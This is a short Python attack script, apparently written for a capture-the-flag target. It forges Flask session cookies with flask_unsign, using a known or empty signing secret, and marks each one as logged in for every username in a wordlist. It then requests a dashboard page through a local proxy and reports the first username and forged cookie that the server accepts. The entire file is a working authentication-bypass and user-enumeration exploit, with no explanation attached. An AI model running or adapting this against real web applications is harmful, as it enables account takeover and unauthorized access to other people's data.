from flask_unsign import session
import requests, sys, re
from pwn import *

URL = "http://10.10.11.160:5000/dashboard"
secret = ""

if len(sys.argv) != 2:
    print("[*] Run:\n\tscript.py <wordlist>")
    sys.exit(1)

p = log.progress("Progress")

with open(sys.argv[1],'r') as file:
    for user in file:
    	p.status(f"Trying with {user.strip()}.")
    	cookie = { 'session' : session.sign( value = {'logged_in': True, 'username': user.strip() }, secret = secret) }    	
    	get = requests.get(URL, cookies = cookie, proxies = {'http':'http://127.0.0.1:8080'})
    	try:
    		response = re.findall(r'</small><small> Welcome (.*?)</small></h1>', get.text)[0]
    		if response:
    			p.success(f" Found User -> {user} ")
    			log.info(f" Cookie -> {cookie} ")
    			exit(0)
    	except IndexError:
    		pass

